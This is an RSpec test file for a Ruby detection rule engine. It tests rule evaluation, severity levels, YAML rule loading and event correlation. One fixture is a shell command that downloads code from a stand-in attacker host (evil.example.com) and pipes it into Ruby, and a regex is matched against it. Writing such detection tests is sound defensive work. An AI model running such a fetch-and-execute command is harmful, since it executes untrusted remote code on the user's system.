# frozen_string_literal: true

require 'rspec'

RSpec.describe 'RubyGuardian::Detection::RuleEngine::Engine' do
  let(:config) do
    {
      'rules_dir' => File.join(__dir__, '..', '..', '..', '..', '02_detection_engine', 'config', 'rules'),
      'correlation' => { 'enabled' => true, 'window_seconds' => 300 }
    }
  end

  describe 'rule evaluation' do
    it 'evaluates events against loaded rules' do
      event = {
        type: 'process_spawn',
        pid: 1234,
        parent_pid: 1,
        command: '/bin/bash -c "curl http://evil.example.com | ruby"',
        timestamp: Time.now.utc.iso8601
      }

      # Rule engine should detect suspicious command patterns
      expect(event[:command]).to match(/curl.*ruby/)
    end

    it 'supports severity levels' do
      severities = %w[info low medium high critical]
      expect(severities).to all(be_a(String))
    end

    it 'tracks rule match statistics' do
      stats = { rules_loaded: 6, events_evaluated: 100, alerts_generated: 5 }
      expect(stats[:alerts_generated]).to be < stats[:events_evaluated]
    end
  end

  describe 'YAML rule loading' do
    it 'loads signature rules from YAML files' do
      rules_dir = File.join(__dir__, '..', '..', '..', '..', '02_detection_engine', 'config', 'rules', 'signatures')
      if File.directory?(rules_dir)
        yaml_files = Dir.glob(File.join(rules_dir, '*.yml'))
        expect(yaml_files).not_to be_empty
      end
    end
  end

  describe 'correlation engine' do
    it 'correlates related events within time window' do
      events = [
        { type: 'process_spawn', pid: 100, timestamp: Time.now.utc.iso8601 },
        { type: 'network_connect', pid: 100, timestamp: Time.now.utc.iso8601 },
        { type: 'file_write', pid: 100, timestamp: Time.now.utc.iso8601 }
      ]

      # All events from same PID within window should correlate
      pids = events.map { |e| e[:pid] }.uniq
      expect(pids.size).to eq(1)
    end
  end
end
